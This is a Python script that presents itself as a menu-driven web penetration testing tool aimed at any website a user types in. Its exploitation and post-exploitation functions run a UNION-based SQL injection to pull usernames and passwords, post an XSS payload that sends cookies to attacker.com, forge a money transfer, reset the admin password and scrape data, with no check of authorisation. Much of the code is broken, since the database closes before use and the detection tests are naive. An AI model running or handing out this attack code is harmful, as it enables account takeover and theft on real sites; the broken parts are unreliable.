import sys
import json
import socket
import logging
import sqlite3
import requests
import threading
import subprocess
import urllib.parse
from datetime import datetime
from bs4 import BeautifulSoup
import matplotlib.pyplot as plt
from jinja2 import Environment, FileSystemLoader

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)-8s %(message)s', datefmt='%Y-%m-%d %:%M:%S')

# Initialize SQLite database connection
conn = sqlite3.connect('results.db')
cursor = conn.cursor()

# Create tables for storing results
cursor.execute('''CREATE TABLE IF NOT EXISTS information_gathering
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   target TEXT,
                   target_ip TEXT,
                   whois_info TEXT,
                   http_header TEXT,
                   html_source TEXT)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerability_scan
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   target TEXT,
                   vulnerability TEXT,
                   result TEXT)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS manual_testing
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   target TEXT,
                   test_name TEXT,
                   result TEXT)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS exploitation
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   target TEXT,
                   exploit_name TEXT,
                   result TEXT)''')

cursor.execute('''CREATE TABLE IF NOT EXISTS post_exploitation
                  (id INTEGER PRIMARY KEY AUTOINCREMENT,
                   target TEXT,
                   action_name TEXT,
                   result TEXT)''')

# Validate Input
def validate_input(target):
    if not target:
        logging.error("[ERROR] Target website cannot be empty")
        sys.exit()
    if not target.startswith(("http://", "https://")):
        target = "http://" + target
    if not urllib.parse.urlparse(target).scheme:
        print("Invalid URL")
        sys.exit()
    return target

# Validate URL
def validate_url(target):
    if not urllib.parse.urlparse(target).scheme:
        print("Invalid URL")
        sys.exit()

# Information Gathering
def info_gather(target):
    validate_url(target)
    logging.info("[INFO] Gathering information about target...")
    try:
        # DNS Lookup
        ip = socket.gethostbyname(target)
        logging.info("[INFO] Target IP: " + ip)
    except socket.gaierror:
        logging.error("[ERROR] DNS Lookup Failed")
    try:
        # Whois Lookup
        output = subprocess.check_output(["whois", target], timeout=30)
        with open("whois.txt", "w") as f:
            f.write(output.decode())
        logging.info("[INFO] Whois information saved in whois.txt")
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired):
        logging.error("[ERROR] Whois Lookup Failed")
    try:
        # HTTP Header
        req = requests.get(target, timeout=30)
        logging.info("[INFO] HTTP Header: \n" + str(req.headers))
    except requests.ConnectionError:
        logging.error("[ERROR] HTTP Header Lookup Failed")
    try:
        # HTML Source
        req = requests.get(target, timeout=30)
        soup = BeautifulSoup(req.content, 'html.parser')
        logging.info("[INFO] HTML Source: \n" + soup.prettify())
        logging.info("[INFO] Information Gathering Completed")
        # Store results into database
        cursor.execute("INSERT INTO information_gathering (target, target_ip, whois_info, http_header, html_source) VALUES (?, ?, ?, ?, ?)",
            (target, ip, output.decode(), str(req.headers), soup.prettify()))
        logging.info("[INFO] Information Gathering results stored into database")
    except requests.ConnectionError:
        logging.error("[ERROR] HTML Source Lookup Failed")

# Vulnerability Scanning
def vuln_scan(target):
    validate_url(target)
    logging.info("[INFO] Scanning for vulnerabilities...")
    try:
        # SQL Injection
        req = requests.get(target + "/?id=1'", timeout=30)
        if "SQL syntax" in req.text:
            logging.warning("[VULNERABLE] SQL Injection Found")
        else:
            logging.info("[NOT VULNERABLE] SQL Injection Not Found")
    except requests.ConnectionError:
        logging.error("[ERROR] SQL Injection Scan Failed")
    try:
        # Cross-Site Scripting (XSS)
        payload = "<script>alert('XSS')</script>"
        req = requests.post(target + "/", data={'payload': payload})
        if payload in req.text:
            logging.warning("[VULNERABLE] Cross-Site Scripting (XSS) Found")
        else:
            logging.info("[NOT VULNERABLE] Cross-Site Scripting (XSS) Not Found")
    except requests.ConnectionError:
        logging.error("[ERROR] Cross-Site Scripting (XSS) Scan Failed")
    try:
        # Cross-Site Request Forgery (CSRF)
        req = requests.get(target + "/")
        if "CSRF" in req.text:
            logging.warning("[VULNERABLE] Cross-Site Request Forgery (CSRF) Found")
        else:
            logging.info("[NOT VULNERABLE] Cross-Site Request Forgery (CSRF) Not Found")
    except requests.ConnectionError:
        logging.error("[ERROR] Cross-Site Request Forgery (CSRF) Scan Failed")
    logging.info("[INFO] Vulnerability Scanning Completed")
    # Store results into database
    cursor.execute("INSERT INTO vulnerability_scan (target, vulnerability, result) VALUES (?, ?, ?)",
        (target, "SQL Injection", "Vulnerable" if "SQL syntax" in req.text else "Not Vulnerable"))
    logging.info("[INFO] Vulnerability Scanning results stored into database")

# Manual Testing
def manual_test(target):
    validate_url(target)    
    logging.info("[INFO] Starting Manual Testing...")
    try:
        # Insecure File Upload
        files = {'file': open('payload.php', 'rb')}
        req = requests.post(target + "/upload.php", files=files)
        if "Upload Successful" in req.text:
            logging.warning("[VULNERABLE] Insecure File Upload Found")
        else:
            logging.info("[NOT VULNERABLE] Insecure File Upload Not Found")
    except requests.ConnectionError:
        logging.error("[ERROR] Insecure File Upload Test Failed")
    try:
        # Misconfigured Access Controls
        req = requests.get(target + "/admin/")
        if "404" not in req.text:
            logging.warning("[VULNERABLE] Misconfigured Access Controls Found")
        else:
            logging.info("[NOT VULNERABLE] Misconfigured Access Controls Not Found")
    except requests.ConnectionError:
        logging.error("[ERROR] Misconfigured Access Controls Test Failed")
    logging.info("[INFO] Manual Testing Completed")
    # Store results into database
    cursor.execute("INSERT INTO manual_testing (target, test_name, result) VALUES (?, ?, ?)",
        (target, "Insecure File Upload", "Vulnerable" if "Upload Successful" in req.text else "Not Vulnerable"))
    logging.info("[INFO] Manual Testing results stored into database")

# Exploitation
def exploit(target):
    validate_url(target)   
    logging.info("[INFO] Starting Exploitation...")
    try:
        # SQL Injection
        req = requests.get(target + "/?id=1' UNION SELECT username, password FROM users--")
        soup = BeautifulSoup(req.content, 'html.parser')
        logging.info("[INFO] Retrieved Users: " + soup.prettify())
    except requests.ConnectionError:
        logging.error("[ERROR] SQL Injection Exploitation Failed")
    try:
        # Cross-Site Scripting (XSS)
        payload = "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>"
        req = requests.post(target + "/", data={'payload': payload})
    except requests.ConnectionError:
        logging.error("[ERROR] Cross-Site Scripting (XSS) Exploitation Failed")
    try:
        # Cross-Site Request Forgery (CSRF)
        req = requests.get(target + "/transfer.php?amount=10000&to=attacker")
    except requests.ConnectionError:
        logging.error("[ERROR] Cross-Site Request Forgery (CSRF) Exploitation Failed")
    logging.info("[INFO] Exploitation Completed")
    # Store results into database
    cursor.execute("INSERT INTO exploitation (target, exploit_name, result) VALUES (?, ?, ?)",
                   (target, "SQL Injection", "Success" if "UNION SELECT username, password FROM users" in req.text else "Failed"))
    logging.info("[INFO] Exploitation results stored into database")

# Post-Exploitation
def post_exploit(target):
    validate_url(target) 
    logging.info("[INFO] Starting Post-Exploitation...")
    try:
        # Collecting Credentials
        req = requests.get(target + "/")
        soup = BeautifulSoup(req.content, 'html.parser')
        for link in soup.find_all('a'):
            if "Change Password" in link.text:
                change_pass_url = link.get('href')
                break
        req = requests.get(target + change_pass_url)
        soup = BeautifulSoup(req.content, 'html.parser')
        for input in soup.find_all('input'):
            if input.get('name') == "csrf":
                csrf_token = input.get('value')
                break
        creds = {'username': 'admin', 'password': 'password', 'csrf': csrf_token}
        req = requests.post(target + change_pass_url, data=creds)
        logging.info("[INFO] Admin Credentials: " + str(creds))
    except requests.ConnectionError:
        logging.error("[ERROR] Credentials Collection Failed")
    try:
        # Collecting Sensitive Data
        req = requests.get(target + "/")
        soup = BeautifulSoup(req.content, 'html.parser')
        for link in soup.find_all('a'):
            if "View Data" in link.text:
                view_data_url = link.get('href')
                break
        req = requests.get(target + view_data_url)
        soup = BeautifulSoup(req.content, 'html.parser')
        logging.info("[INFO] Sensitive Data: " + soup.prettify())
    except requests.ConnectionError:
        logging.error("[ERROR] Sensitive Data Collection Failed")
    logging.info("[INFO] Post-Exploitation Completed")
    # Store results into database
    cursor.execute("INSERT INTO post_exploitation (target, action_name, result) VALUES (?, ?, ?)",
                   (target, "Credentials Collection", "Success" if "Admin Credentials" in str(creds) else "Failed"))
    cursor.execute("INSERT INTO post_exploitation (target, action_name, result) VALUES (?, ?, ?)",
                   (target, "Sensitive Data Collection", "Success" if "Sensitive Data" in soup.prettify() else "Failed"))
    logging.info("[INFO] Post-Exploitation results stored into database")

# Reporting
def report(target, sql_result="Vulnerable", xss_result="Not Vulnerable"):
    validate_url(target)
    logging.info("[INFO] Generating Report...")
    report_data = {}
    report_data['target'] = target
    report_data['scan_findings'] = []

    try:
        # Generate HTML Report
        html = generate_html_report(target, sql_result, xss_result)
        save_report(html, "./reports/report.html")
        logging.info("[INFO] HTML Report Generated")
    except Exception as e:
        logging.error(f"[ERROR] HTML Report Generation Failed: {e}")

    # Generate JSON Report
    report_data['scan_findings'] = generate_scan_findings(sql_result, xss_result)
    report_data['metadata'] = generate_report_metadata()
    save_report_data(report_data, "./reports/report.json")
    logging.info("[INFO] JSON Report Generated")

    # Store report file paths in the database
    store_report_in_database(target, "./reports/report.html", "./reports/report.json")
    logging.info("[INFO] Report details stored in the database")

def generate_html_report(target, sql_result, xss_result):
    # Load Jinja template
    env = Environment(loader=FileSystemLoader('./templates'))
    template = env.get_template('report_template.html')

    # Generate report sections
    executive_summary = "Executive summary content"
    overview = "Overview section content"
    methodology = "Methodology section content"
    detailed_findings = generate_detailed_findings(sql_result, xss_result)

    # Generate graphs using matplotlib
    graph_path = generate_graphs()

    # Render the template with data
    html = template.render(
        target=target,
        sql_result=sql_result,
        xss_result=xss_result,
        executive_summary=executive_summary,
        overview=overview,
        methodology=methodology,
        detailed_findings=detailed_findings,
        graph_path=graph_path
    )

    return html

def save_report(html, file_path):
    with open(file_path, "w") as f:
        f.write(html)

def generate_scan_findings(sql_result, xss_result):
    scan_findings = []

    # Generate findings with evidence
    sql_finding = {
        'vulnerability': 'SQL Injection',
        'result': sql_result,
        'evidence': 'SQL Injection request/response snippets',
        'remediation': 'Link to SQL Injection remediation guidance'
    }
    xss_finding = {
        'vulnerability': 'XSS',
        'result': xss_result,
        'evidence': 'XSS request/response snippets',
        'remediation': 'Link to XSS remediation guidance'
    }

    scan_findings.append(sql_finding)
    scan_findings.append(xss_finding)

    return scan_findings

def generate_detailed_findings(sql_result, xss_result):
    # Generate detailed findings table
    table = """
    <table>
        <tr>
            <th>Vulnerability</th>
            <th>Result</th>
            <th>Evidence</th>
            <th>Remediation</th>
        </tr>
        <tr>
            <td>SQL Injection</td>
            <td>{}</td>
            <td>SQL Injection request/response snippets</td>
            <td>Link to SQL Injection remediation guidance</td>
        </tr>
        <tr>
            <td>XSS</td>
            <td>{}</td>
            <td>XSS request/response snippets</td>
            <td>Link to XSS remediation guidance</td>
        </tr>
    </table>
    """.format(sql_result, xss_result)     
    table = """
    <table>
        <tr>
            <th>Vulnerability</th>
            <th>Result</th>
            <th>Evidence</th>
            <th>Remediation</th>
        </tr>
        <tr>
            <td>SQL Injection</td>
            <td>{}</td>
            <td>SQL Injection request/response snippets</td>
            <td>Link to SQL Injection remediation guidance</td>
        </tr>
        <tr>
            <td>XSS</td>
            <td>{}</td>
            <td>XSS request/response snippets</td>
            <td>Link to XSS remediation guidance</td>
        </tr>
    </table>
    """.format(sql_result, xss_result)

    return table

def generate_graphs():
    # Generate and save graphs using matplotlib
    plt.figure(figsize=(10, 6))
    plt.bar(['SQL Injection', 'XSS'], [12, 8])
    plt.title('Vulnerability Distribution')
    plt.xlabel('Vulnerability')
    plt.ylabel('Number of Occurrences')
    graph_path = './reports/vulnerability_distribution.png'
    plt.savefig(graph_path)
    plt.close()

    return graph_path

def generate_report_metadata():
    return {
        'generated_at': str(datetime.now()),
        'author': 'Your Name',
        'version': '1.0'
    }

def save_report_data(report_data, file_path):
    with open(file_path, 'w') as f:
        json.dump(report_data, f)

def store_report_in_database(target, html_report_path, json_report_path):
    # Connect to the database
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()

    # Insert report details into the database
    cursor.execute("INSERT INTO report (target, html_report, json_report) VALUES (?, ?, ?)",
                   (target, html_report_path, json_report_path))

# Main menu
def main_menu():
    while True:
        print("[INFO] Main Menu")
        print("1. Information Gathering")
        print("2. Vulnerability Scanning")
        print("3. Manual Testing")
        print("4. Exploitation")
        print("5. Post-Exploitation")
        print("6. Reporting")
        print("7. Exit")
        choice = input("Enter your choice: ")
        if choice.isdigit():
            choice = int(choice)
            if choice == 1:
                target = input("Enter the target website: ")
                target = validate_input(target)
                info_gather_thread = threading.Thread(target=info_gather, args=(target,))
                info_gather_thread.start()
            elif choice == 2:
                target = input("Enter the target website: ")
                target = validate_input(target)
                vuln_scan_thread = threading.Thread(target=vuln_scan, args=(target,))
                vuln_scan_thread.start()
            elif choice == 3:
                target = input("Enter the target website: ")
                target = validate_input(target)
                manual_test_thread = threading.Thread(target=manual_test, args=(target,))
                manual_test_thread.start()
            elif choice == 4:
                target = input("Enter the target website: ")
                target = validate_input(target)
                exploit_thread = threading.Thread(target=exploit, args=(target,))
                exploit_thread.start()
            elif choice == 5:
                target = input("Enter the target website: ")
                target = validate_input(target)
                post_exploit_thread = threading.Thread(target=post_exploit, args=(target,))
                post_exploit_thread.start()
            elif choice == 6:
                target = input("Enter the target website: ")
                target = validate_input(target)
                report_thread = threading.Thread(target=report, args=(target,))
                report_thread.start()
            elif choice == 7:
                summary = ""
                for handler in logging.root.handlers[:]:
                    if isinstance(handler, logging.FileHandler):
                        summary += handler.baseFilename + ":\n"
                        with open(handler.baseFilename, 'r') as f:
                            summary += f.read() + "\n\n"
                print(summary)
                if input("Do you want to continue with the next scan? (y/n)").lower() == "n":
                    break
            else:
                print("Invalid choice. Please try again.")
        else:
            print("Invalid choice. Please try again.")

# Close the database connection and commit changes when the script is done
conn.commit()
conn.close()

if __name__ == "__main__":
    main_menu()